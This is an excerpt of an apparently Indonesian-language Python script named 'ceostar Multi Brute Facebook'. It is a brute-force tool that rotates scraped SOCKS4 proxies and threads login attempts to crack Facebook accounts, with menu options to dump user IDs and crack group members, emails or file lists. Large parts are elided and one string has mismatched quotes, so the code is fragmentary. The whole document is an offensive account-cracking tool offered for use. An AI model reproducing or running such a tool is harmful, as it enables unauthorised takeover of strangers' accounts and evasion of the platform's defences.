...
from concurrent.futures import ThreadPoolExecutor as ceostar
...
sys.stdout.write('\x1b]2; BMBF | ceostar Multi Brute Facebook\x07')
#------------------[ USER-AGENT ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari ceostar")
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n [+] Login Berhasil | python ceostar.py");exit()
			except Exception as e:
...
def menu(my_name,my_id):
	...
	_____ceo___star____ = input(f' [+] Pilih Menu Crack : ')
	if _____ceo___star____ in ['1','01']:
		ceo_dump()
	elif _____ceo___star____ in ['2','02']:
		dump_massal()
	elif _____ceo___star____ in ['3','03']:
		crack_group()
	elif _____ceo___star____ in ['4','04']:
		crack_email()
	elif _____ceo___star____ in ['5','05']:
		crack_file()
